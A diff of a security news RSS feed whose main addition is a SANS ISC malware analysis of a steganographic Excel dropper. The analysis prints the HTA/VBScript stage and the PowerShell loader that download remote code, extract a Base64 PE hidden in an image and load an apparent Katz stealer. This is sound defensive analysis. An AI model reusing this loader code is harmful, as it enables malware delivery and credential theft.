@@ -1,5 +1,188 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Sat, 14 Jun 2025 07:59:18 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Friday, June 13th, 2025 https://isc.sans.edu/podcastdetail/9492</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>New Way to Covertly Track Android Users</title><link>https://www.schneier.com/blog/archives/2025/06/new-way-to-track-covertly-android-users.html</link><description>&lt;p&gt;Researchers have &lt;a href="https://localmess.github.io/"&gt;discovered&lt;/a&gt; a new way to covertly track Android users. Both Meta and Yandex were using it, but have suddenly stopped now that they have been caught.&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Sat, 14 Jun 2025 08:59:17 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>More Steganography&amp;#x21;</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>More Steganography&amp;#x21;, (Sat, Jun 14th)</title><link>https://isc.sans.edu/diary/rss/32044</link><description>&lt;p&gt;I spotted another interesting file that uses, once again, steganography. It seems to be a trend (see one of my previous diaries&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;x5b&amp;#x3b;&lt;a href="https://isc.sans.edu/diary/A&amp;amp;&amp;amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;amp;#x23&amp;#x3b;x2b&amp;#x3b;PNG&amp;amp;&amp;amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;amp;#x23&amp;#x3b;x2b&amp;#x3b;Image&amp;amp;&amp;amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;amp;#x23&amp;#x3b;x2b&amp;#x3b;With&amp;amp;&amp;amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;amp;#x23&amp;#x3b;x2b&amp;#x3b;an&amp;amp;&amp;amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;amp;#x23&amp;#x3b;x2b&amp;#x3b;Embedded&amp;amp;&amp;amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;amp;#x23&amp;#x3b;x2b&amp;#x3b;Gift/31998"&gt;1&lt;/a&gt;&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;x5d&amp;#x3b;). The file is an malicious Excel sheet called blcopy.xls. Office documents are rare these days because Microsoft improved the rules to allow automatic macro execution&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;x5b&amp;#x3b;&lt;a href="https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked"&gt;2&lt;/a&gt;&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;x5d&amp;#x3b;. But it does not mean that Office documents can&amp;&amp;#x23&amp;#x3b;x26&amp;#x3b;&amp;#x23&amp;#x3b;39&amp;#x3b;t execute malicious code. In the sample I found (SHA256:c92c761a4c5c3f44e914d6654a678953d56d4d3a2329433afe1710b59c9acd3a), there are other embedded XLS sheets:&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;I spotted another interesting file that uses, once again, steganography. It seems to be a trend (see one of my previous diaries[&lt;a href="https://isc.sans.edu/diary/A+PNG+Image+With+an+Embedded+Gift/31998"&gt;1&lt;/a&gt;]). The file is an malicious Excel sheet called blcopy.xls. Office documents are rare these days because Microsoft improved the rules to allow automatic macro execution[&lt;a href="https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked"&gt;2&lt;/a&gt;]. But it does not mean that Office documents can't execute malicious code. In the sample I found (SHA256:c92c761a4c5c3f44e914d6654a678953d56d4d3a2329433afe1710b59c9acd3a), there are other embedded XLS sheets:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+remnux@remnux:~/malwarezoo/20250611$ oledump.py blcopy.xls
+  1:       114 '\x01CompObj'
+  2:       244 '\x05DocumentSummaryInformation'
+  3:       200 '\x05SummaryInformation'
+  4:       114 'MBD012124E0/\x01CompObj'
+  5:       448 'MBD012124E0/\x05DocumentSummaryInformation'
+  6:     27016 'MBD012124E0/\x05SummaryInformation'
+  7:       114 'MBD012124E0/MBD008FCB33/\x01CompObj'
+  8:     68088 'MBD012124E0/MBD008FCB33/Package'
+  9:       114 'MBD012124E0/MBD008FD33C/\x01CompObj'
+ 10:       652 'MBD012124E0/MBD008FD33C/\x05DocumentSummaryInformation'
+ 11:     30228 'MBD012124E0/MBD008FD33C/\x05SummaryInformation'
+ 12:    218567 'MBD012124E0/MBD008FD33C/Workbook'
+ 13:       114 'MBD012124E0/MBD008FDB50/\x01CompObj'
+ 14:    111781 'MBD012124E0/MBD008FDB50/Package'
+ 15:       114 'MBD012124E0/MBD008FED44/\x01CompObj'
+ 16:    408066 'MBD012124E0/MBD008FED44/Package'
+ 17:    373246 'MBD012124E0/Workbook'
+ 18:       716 'MBD012124E1/\x01Ole'
+ 19:    442912 'Workbook'
+ 20:       525 '_VBA_PROJECT_CUR/PROJECT'
+ 21:       104 '_VBA_PROJECT_CUR/PROJECTwm'
+ 22: m     977 '_VBA_PROJECT_CUR/VBA/Sheet1'
+ 23: m     977 '_VBA_PROJECT_CUR/VBA/Sheet2'
+ 24: m     977 '_VBA_PROJECT_CUR/VBA/Sheet3'
+ 25: m     985 '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
+ 26:      2644 '_VBA_PROJECT_CUR/VBA/_VBA_PROJECT'
+ 27:       553 '_VBA_PROJECT_CUR/VBA/dir'
+
+remnux@remnux:~/malwarezoo/20250611$ oledump.py blcopy.xls -s 14 -d | zipdump.py
+Index Filename                                 Encrypted Timestamp           
+    1 [Content_Types].xml                              0 1980-01-01 00:00:00 
+    2 _rels/.rels                                      0 1980-01-01 00:00:00 
+    3 xl/_rels/workbook.xml.rels                       0 1980-01-01 00:00:00 
+    4 xl/workbook.xml                                  0 1980-01-01 00:00:00 
+    5 xl/worksheets/sheet4.xml                         0 1980-01-01 00:00:00 
+    6 xl/worksheets/_rels/sheet5.xml.rels              0 1980-01-01 00:00:00 
+    7 xl/worksheets/_rels/sheet4.xml.rels              0 1980-01-01 00:00:00 
+    8 xl/worksheets/_rels/sheet3.xml.rels              0 1980-01-01 00:00:00 
+    9 xl/worksheets/_rels/sheet2.xml.rels              0 1980-01-01 00:00:00 
+   10 xl/worksheets/_rels/sheet1.xml.rels              0 1980-01-01 00:00:00 
+   11 xl/worksheets/sheet2.xml                         0 1980-01-01 00:00:00 
+   12 xl/worksheets/_rels/sheet6.xml.rels              0 1980-01-01 00:00:00 
+   13 xl/worksheets/_rels/sheet7.xml.rels              0 1980-01-01 00:00:00 
+   14 xl/worksheets/_rels/sheet8.xml.rels              0 1980-01-01 00:00:00 
+   15 xl/worksheets/_rels/sheet13.xml.rels             0 1980-01-01 00:00:00 
+   16 xl/worksheets/_rels/sheet12.xml.rels             0 1980-01-01 00:00:00 
+   17 xl/worksheets/_rels/sheet11.xml.rels             0 1980-01-01 00:00:00 
+   18 xl/worksheets/_rels/sheet10.xml.rels             0 1980-01-01 00:00:00 
+   19 xl/worksheets/_rels/sheet9.xml.rels              0 1980-01-01 00:00:00 
+   20 xl/worksheets/sheet3.xml                         0 1980-01-01 00:00:00 
+   21 xl/worksheets/sheet1.xml                         0 1980-01-01 00:00:00 
+   22 xl/styles.xml                                    0 1980-01-01 00:00:00 
+   23 xl/worksheets/sheet11.xml                        0 1980-01-01 00:00:00 
+   24 xl/worksheets/sheet12.xml                        0 1980-01-01 00:00:00 
+   25 xl/worksheets/sheet13.xml                        0 1980-01-01 00:00:00 
+   26 xl/theme/theme1.xml                              0 1980-01-01 00:00:00 
+   27 xl/sharedStrings.xml                             0 1980-01-01 00:00:00 
+   28 xl/worksheets/sheet10.xml                        0 1980-01-01 00:00:00 
+   29 xl/worksheets/sheet8.xml                         0 1980-01-01 00:00:00 
+   30 xl/worksheets/sheet5.xml                         0 1980-01-01 00:00:00 
+   31 xl/worksheets/sheet6.xml                         0 1980-01-01 00:00:00 
+   32 xl/worksheets/sheet7.xml                         0 1980-01-01 00:00:00 
+   33 xl/worksheets/sheet9.xml                         0 1980-01-01 00:00:00 
+   34 xl/printerSettings/printerSettings5.bin          0 1980-01-01 00:00:00 
+   35 xl/printerSettings/printerSettings4.bin          0 1980-01-01 00:00:00 
+   36 xl/printerSettings/printerSettings2.bin          0 1980-01-01 00:00:00 
+   37 xl/printerSettings/printerSettings6.bin          0 1980-01-01 00:00:00 
+   38 xl/printerSettings/printerSettings7.bin          0 1980-01-01 00:00:00 
+   39 xl/printerSettings/printerSettings8.bin          0 1980-01-01 00:00:00 
+   40 xl/printerSettings/printerSettings9.bin          0 1980-01-01 00:00:00 
+   41 xl/printerSettings/printerSettings10.bin         0 1980-01-01 00:00:00 
+   42 xl/printerSettings/printerSettings11.bin         0 1980-01-01 00:00:00 
+   43 xl/printerSettings/printerSettings12.bin         0 1980-01-01 00:00:00 
+   44 xl/printerSettings/printerSettings13.bin         0 1980-01-01 00:00:00 
+   45 xl/printerSettings/printerSettings3.bin          0 1980-01-01 00:00:00 
+   46 xl/printerSettings/printerSettings1.bin          0 1980-01-01 00:00:00 
+   47 docProps/thumbnail.wmf                           0 1980-01-01 00:00:00 
+   48 docProps/core.xml                                0 1980-01-01 00:00:00 
+   49 docProps/app.xml                                 0 1980-01-01 00:00:00 
+&lt;/pre&gt;
+
+&lt;p&gt;Let's focus on the payload downloaded by this file:&amp;nbsp;&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+hxxp://107[.]172[.]235[.]203/245/wecreatedbestsolutionswithniceworkingskill.hta
+&lt;/pre&gt;
+
+&lt;p&gt;This HTA file will generate&amp;nbsp;a BAT file ('C:\Windows\Temp\invertase.bat')&amp;nbsp;that will generate and execute a VBS file ('C:\Windows\Temp\poikilohydric.vbs'):&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+&amp;lt;script language=&amp;quot;VBScript&amp;quot;&amp;gt;
+  Dim adarme
+  Set adarme = CreateObject(&amp;quot;WScript.Shell&amp;quot;)
+  Dim bondwoman
+  bondwoman = &amp;quot;C:\Windows\Temp\invertase.bat&amp;quot;
+  Dim leucanthemum, methylamines
+  Set leucanthemum = CreateObject(&amp;quot;Scripting.FileSystemObject&amp;quot;)
+  Set methylamines = leucanthemum.CreateTextFile(bondwoman, True)
+  methylamines.WriteLine &amp;quot;@echo off&amp;quot;
+  methylamines.WriteLine &amp;quot;setlocal&amp;quot;
+  methylamines.WriteLine &amp;quot;set &amp;quot;&amp;quot;fugues=C:\Windows\Temp\poikilohydric.vbs&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;echo Dim morasses, raconteur &amp;gt; &amp;quot;&amp;quot;%fugues%&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;echo morasses = Replace(StrReverse(&amp;quot;&amp;quot;0@/@b@j@l@A@h@f@i@t@/@d@/@e@e@.@e@t@s@a@p@/@/@:@p@t@t
+@h@&amp;quot;&amp;quot;), &amp;quot;&amp;quot;@&amp;quot;&amp;quot;, &amp;quot;&amp;quot;&amp;quot;&amp;quot;) &amp;gt;&amp;gt; &amp;quot;&amp;quot;%fugues%&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;echo Set raconteur = CreateObject(&amp;quot;&amp;quot;MSXML2.ServerXMLHTTP&amp;quot;&amp;quot;) &amp;gt;&amp;gt; &amp;quot;&amp;quot;%fugues%&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;echo raconteur.open &amp;quot;&amp;quot;GET&amp;quot;&amp;quot;, morasses, False &amp;gt;&amp;gt; &amp;quot;&amp;quot;%fugues%&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;echo raconteur.send &amp;gt;&amp;gt; &amp;quot;&amp;quot;%fugues%&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;echo If raconteur.Status = 200 Then &amp;gt;&amp;gt; &amp;quot;&amp;quot;%fugues%&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;echo     ExecuteGlobal raconteur.responseText &amp;gt;&amp;gt; &amp;quot;&amp;quot;%fugues%&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;echo End If &amp;gt;&amp;gt; &amp;quot;&amp;quot;%fugues%&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;start &amp;quot;&amp;quot;&amp;quot;&amp;quot; /b wscript //nologo &amp;quot;&amp;quot;%fugues%&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;timeout /t 1 /nobreak &amp;gt;nul&amp;quot;
+  methylamines.WriteLine &amp;quot;del &amp;quot;&amp;quot;%fugues%&amp;quot;&amp;quot;&amp;quot;
+  methylamines.WriteLine &amp;quot;endlocal&amp;quot;        
+  methylamines.Close
+  adarme.Run &amp;quot;cmd.exe /c &amp;quot;&amp;quot;&amp;quot; &amp;amp; bondwoman &amp;amp; &amp;quot;&amp;quot;&amp;quot;&amp;quot;, 0, False        
+  window.close
+&amp;lt;/script&amp;gt;&lt;/pre&gt;
+
+&lt;p&gt;The generated VBS file will fetch the next payload from the following URL:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+hxxp://paste[.]ee/d/tifhAljb/0&lt;/pre&gt;
+
+&lt;p&gt;This URL will fetch a long VBA script (SHA256:352ef6f5c4568d6ed6a018a5128cf538d33ea72bd040f0fd3b9bca6bd6a5dae9) that will generate a PowerShell script and execute it:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+$SuperSkills='SilentlyContinue';
+$preparsed='hxxps://zynova[.]kesug[.]com/new_image.jpg';
+$thysanurous=New-Object System.Net.WebClient;
+$thysanurous.Headers.Add('User-Agent','Mozilla/5.0');
+[byte[]]$phytoestrogens=$thysanurous.DownloadData($preparsed);
+$septentrions=[System.Text.Encoding]::UTF8.GetString($phytoestrogens);
+$incunabula='INICIO&amp;gt;&amp;gt;';
+$prescience='&amp;lt;&amp;lt;FIM&amp;gt;&amp;gt;';
+$madrina=$newsbot;
+$nectaries=$septentrions.IndexOf($incunabula);
+$fiftysomethings=$septentrions.IndexOf($prescience);
+if($nectaries -ne -1 -and $fiftysomethings -ne -1 -and $fiftysomethings -gt $nectaries)
+{
+    $nectaries+=$incunabula.Length;
+    $madrina=$septentrions.Substring($nectaries,$fiftysomethings-$nectaries)
+};
+$dachshunds='war/EP#7afLl/ppa.yfe#sap//:sp##h';
+$dachshunds=$dachshunds.Replace('#','t');
+$madrina=$madrina.Replace('@','A');
+$nonassessable=[System.Convert]::FromBase64String($madrina);
+$narratology=[Reflection.Assembly]::Load($nonassessable);
+$toxodont=[dnlib.IO.Home].GetMethod('VAI').Invoke($newsbot,[object[]]@($dachshunds,'','','','aspnet_compiler','','','','','C:\Users\Public\Downloads','maungy','vbs','','','lygzeid','2',''));
+&lt;/pre&gt;
+
+&lt;p&gt;That's where the steganography stuff will happen!&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/isc-20250614-1.png" style="width: 800px; height: 554px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;The technique used by the attacker is to add a malicious payload to the picture, delimited by the tags &amp;quot;INICIO&amp;gt;&amp;gt;&amp;quot; and &amp;quot;&amp;lt;&amp;lt;FIM&amp;gt;&amp;gt;&amp;quot;:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+remnux@remnux:~/malwarezoo/20250611$ grep -a -A 3 &amp;quot;INICIO&amp;quot; new_image.jpg | more
+N@�2�Sd�A��#*aɓ$�+!�w�$�2d8$� m��K&amp;lt;�&amp;quot;�y^?�|���0Sg�r;d��L�2d_��INICIO&amp;gt;&amp;gt;&lt;span style="color: #c0392b;"&gt;TVqQ@@&lt;/span&gt;M@@@@E@@@@//8@@Lg@@@@@@@@@Q@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@g@@@@@4fug4@t@nNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJ@@@@@@@@@BQ
+RQ@@T@ED@ExVKLM@@@@@@@@@@O@@DiEL@T@@@Fg1@@@I@@@@@@@@znY1@@@g@@@@gDU@@@B@@@@g@@@@@g@@B@@@@@@@@@@G@@@@@@@@@@D@NQ@@@g@@@@@@@@
+M@YIU@@B@@@B@@@@@@E@@@E@@@@@@@@@8@@@@@@@@@@@@@@IB2NQBL@@@@@I@1@P@F@@@@@@@@@@@@@@@@@@@@@@@@@K@1@@w@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@I@@@C@@@@@@@@@@@@@@@CC@@@Eg@@@@@@@@@@@@@@C50ZXh0@@@@1FY1@@@g@@@@WDU@@@I@@@@@@@
+@@@@@@@@@@@C@@@G@ucnNyYw@@@P@F@@@@gDU@@@Y@@@BaNQ@@@@@@@@@@@@@@@@B@@@B@LnJlbG9j@@@M@@@@@K@1@@@C@@@@YDU@@@@@@@@@@@@@@@@@Q@@@&lt;/pre&gt;
+
+&lt;p&gt;Can you spot the interesting magic bytes? (In red) They indicate the presence of a Base64-encode PE file!&lt;/p&gt;
+
+&lt;p&gt;The decoded an deobfuscated&amp;nbsp;payload is a DLL that is loaded and executed! (SHA256:5a73927d56c0fd4a805489d5817e1aa4fbd491e5a91ed36f4a2babef74158912). It seems to be a&amp;nbsp;Katz stealer. Now you have more fresh meat to analyze!&lt;/p&gt;
+
+&lt;p&gt;[1]&amp;nbsp;&lt;a href="https://isc.sans.edu/diary/A+PNG+Image+With+an+Embedded+Gift/31998"&gt;https://isc.sans.edu/diary/A+PNG+Image+With+an+Embedded+Gift/31998&lt;/a&gt;&lt;br /&gt;
+[2]&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked"&gt;https://learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Xavier Mertens (@xme)&lt;br /&gt;
+Xameco&lt;br /&gt;
+Senior ISC Handler - Freelance Cyber Security Consultant&lt;br /&gt;
+&lt;a href="https://keybase.io/xme/key.asc"&gt;PGP Key&lt;/a&gt;&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32044</guid></item><item><title>New Way to Covertly Track Android Users</title><link>https://www.schneier.com/blog/archives/2025/06/new-way-to-track-covertly-android-users.html</link><description>&lt;p&gt;Researchers have &lt;a href="https://localmess.github.io/"&gt;discovered&lt;/a&gt; a new way to covertly track Android users. Both Meta and Yandex were using it, but have suddenly stopped now that they have been caught.&lt;/p&gt;
 &lt;p&gt;The &lt;a href="https://arstechnica.com/security/2025/06/meta-and-yandex-are-de-anonymizing-android-users-web-browsing-identifiers/"&gt;details&lt;/a&gt; are interesting, and worth reading in detail:&lt;/p&gt;
 &lt;blockquote&gt;&lt;p&gt;Tracking code that Meta and Russia-based Yandex embed into millions of websites is de-anonymizing visitors by abusing legitimate Internet protocols, causing Chrome and other browsers to surreptitiously send unique identifiers to native apps installed on a device, &lt;a href="https://localmess.github.io/"&gt;researchers have discovered&lt;/a&gt;. Google says it&amp;#8217;s investigating the abuse, which allows Meta and Yandex to convert ephemeral web identifiers into persistent mobile app user identities...&lt;/p&gt;&lt;/blockquote&gt;</description><content:encoded>&lt;p&gt;Researchers have &lt;a href="https://localmess.github.io/"&gt;discovered&lt;/a&gt; a new way to covertly track Android users. Both Meta and Yandex were using it, but have suddenly stopped now that they have been caught.&lt;/p&gt;
 &lt;p&gt;The &lt;a href="https://arstechnica.com/security/2025/06/meta-and-yandex-are-de-anonymizing-android-users-web-browsing-identifiers/"&gt;details&lt;/a&gt; are interesting, and worth reading in detail:&lt;/p&gt;
@@ -5932,7 +6115,7 @@ MC4CAQAwBQYDK2VwBCIEINArpOAwJO2+lv9Da+PzmkbKxGhMcapQ+/NhUq4nifvh
 
 
 &lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/the-documents-you-need-to-comply-with-the-gdpr"&gt;GDPR Documentation: The Documents You Need to Comply with the UK and EU GDPR&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.itgovernance.co.uk/blog/?p=29243</guid><category>Data Protection</category><category>GDPR</category><category>consent</category><category>data breach notification</category><category>data protection policy</category><category>DPIA</category><category>DPO</category><category>EU General Data Protection Regulation</category><category>subject access request</category></item><item><title>ISC Stormcast For Monday, June 9th, 2025 https://isc.sans.edu/podcastdetail/9484, (Mon, Jun 9th)</title><link>https://isc.sans.edu/diary/rss/32028</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/32028</guid></item><item><title>Keeping Pace and Embracing Emerging Technologies</title><link>https://www.trendmicro.com/en_us/research/25/f/emerging-technologies-motorsport.html</link><description>Trend Micro and the NEOM McLaren Formula E Team stay ahead of the curve by embracing new technologies, fostering a no-blame culture, and making split-second decisions in high-stakes environments.</description><guid isPermaLink="false">urn:uuid:dceb14d3-ecac-1ba9-9028-19d1f3f54f40</guid><category>Trend Micro Research : Cyber Crime</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Expert Perspective</category><category>Trend Micro Research : Video</category><category>Trend Micro Research : Cyber Threats</category></item><item><title>The Mystery of iPhone Crashes That Apple Denies Are Linked to Chinese Hacking</title><link>https://www.wired.com/story/mystery-of-iphone-crashes-that-apple-denies-are-linked-to-chinese-hacking/</link><description>Plus: A 22-year-old former intern gets put in charge of a key anti-terrorism program, threat intelligence firms finally wrangle their confusing names for hacker groups, and more.</description><guid isPermaLink="false">68431354546bf069da326828</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / National Security</category><category>Security / Security News</category><category>security roundup</category><category>cybersecurity</category><category>encryption</category><category>China</category><category>hacking</category><category>national security</category><category>terrorism</category><category>iPhone</category><category>Department of Homeland Security</category><category>Security Roundup</category></item><item><title>Cybercriminals Are Hiding Malicious Web Traffic in Plain Sight</title><link>https://www.wired.com/story/cybercriminals-are-hiding-malicious-web-traffic-in-plain-sight/</link><description>In an effort to evade detection, cybercriminals are increasingly turning to “residential proxy” services that cover their tracks by making it look like everyday online activity.</description><guid isPermaLink="false">6840728a77f73e0f1607d48a</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / Privacy</category><category>Security / Security News</category><category>cybersecurity</category><category>security</category><category>hacking</category><category>Crime</category><category>hackers</category><category>VPN</category><category>All Mixed Up</category></item><item><title>Report on the Malicious Uses of AI</title><link>https://www.schneier.com/blog/archives/2025/06/report-on-the-malicious-uses-of-ai.html</link><description>&lt;p&gt;OpenAI just &lt;a href="https://openai.com/global-affairs/disrupting-malicious-uses-of-ai-june-2025/"&gt;published&lt;/a&gt; its annual report on malicious uses of AI.&lt;/p&gt;
+&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/the-documents-you-need-to-comply-with-the-gdpr"&gt;GDPR Documentation: The Documents You Need to Comply with the UK and EU GDPR&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.itgovernance.co.uk/blog/?p=29243</guid><category>Data Protection</category><category>GDPR</category><category>consent</category><category>data breach notification</category><category>data protection policy</category><category>DPIA</category><category>DPO</category><category>EU General Data Protection Regulation</category><category>subject access request</category></item><item><title>Keeping Pace and Embracing Emerging Technologies</title><link>https://www.trendmicro.com/en_us/research/25/f/emerging-technologies-motorsport.html</link><description>Trend Micro and the NEOM McLaren Formula E Team stay ahead of the curve by embracing new technologies, fostering a no-blame culture, and making split-second decisions in high-stakes environments.</description><guid isPermaLink="false">urn:uuid:dceb14d3-ecac-1ba9-9028-19d1f3f54f40</guid><category>Trend Micro Research : Cyber Crime</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Expert Perspective</category><category>Trend Micro Research : Video</category><category>Trend Micro Research : Cyber Threats</category></item><item><title>The Mystery of iPhone Crashes That Apple Denies Are Linked to Chinese Hacking</title><link>https://www.wired.com/story/mystery-of-iphone-crashes-that-apple-denies-are-linked-to-chinese-hacking/</link><description>Plus: A 22-year-old former intern gets put in charge of a key anti-terrorism program, threat intelligence firms finally wrangle their confusing names for hacker groups, and more.</description><guid isPermaLink="false">68431354546bf069da326828</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / National Security</category><category>Security / Security News</category><category>security roundup</category><category>cybersecurity</category><category>encryption</category><category>China</category><category>hacking</category><category>national security</category><category>terrorism</category><category>iPhone</category><category>Department of Homeland Security</category><category>Security Roundup</category></item><item><title>Cybercriminals Are Hiding Malicious Web Traffic in Plain Sight</title><link>https://www.wired.com/story/cybercriminals-are-hiding-malicious-web-traffic-in-plain-sight/</link><description>In an effort to evade detection, cybercriminals are increasingly turning to “residential proxy” services that cover their tracks by making it look like everyday online activity.</description><guid isPermaLink="false">6840728a77f73e0f1607d48a</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / Privacy</category><category>Security / Security News</category><category>cybersecurity</category><category>security</category><category>hacking</category><category>Crime</category><category>hackers</category><category>VPN</category><category>All Mixed Up</category></item><item><title>Report on the Malicious Uses of AI</title><link>https://www.schneier.com/blog/archives/2025/06/report-on-the-malicious-uses-of-ai.html</link><description>&lt;p&gt;OpenAI just &lt;a href="https://openai.com/global-affairs/disrupting-malicious-uses-of-ai-june-2025/"&gt;published&lt;/a&gt; its annual report on malicious uses of AI.&lt;/p&gt;
 &lt;blockquote&gt;&lt;p&gt;By using AI as a force multiplier for our expert investigative teams, in the three months since our last report we’ve been able to detect, disrupt and expose abusive activity including social engineering, cyber espionage, deceptive employment schemes, covert influence operations and scams. &lt;/p&gt;
 &lt;p&gt;These operations originated in many parts of the world, acted in many different ways, and focused on many different targets. A significant number appeared to originate in China: Four of the 10 cases in this report, spanning social engineering, covert influence operations and cyber threats, likely had a Chinese origin. But we’ve disrupted abuses from many other countries too: this report includes case studies of a likely task scam from Cambodia, comment spamming apparently from the Philippines, covert influence attempts potentially linked with Russia and Iran, and deceptive employment schemes...&lt;/p&gt;&lt;/blockquote&gt;</description><content:encoded>&lt;p&gt;OpenAI just &lt;a href="https://openai.com/global-affairs/disrupting-malicious-uses-of-ai-june-2025/"&gt;published&lt;/a&gt; its annual report on malicious uses of AI.&lt;/p&gt;
 &lt;blockquote&gt;&lt;p&gt;By using AI as a force multiplier for our expert investigative teams, in the three months since our last report we’ve been able to detect, disrupt and expose abusive activity including social engineering, cyber espionage, deceptive employment schemes, covert influence operations and scams. &lt;/p&gt;
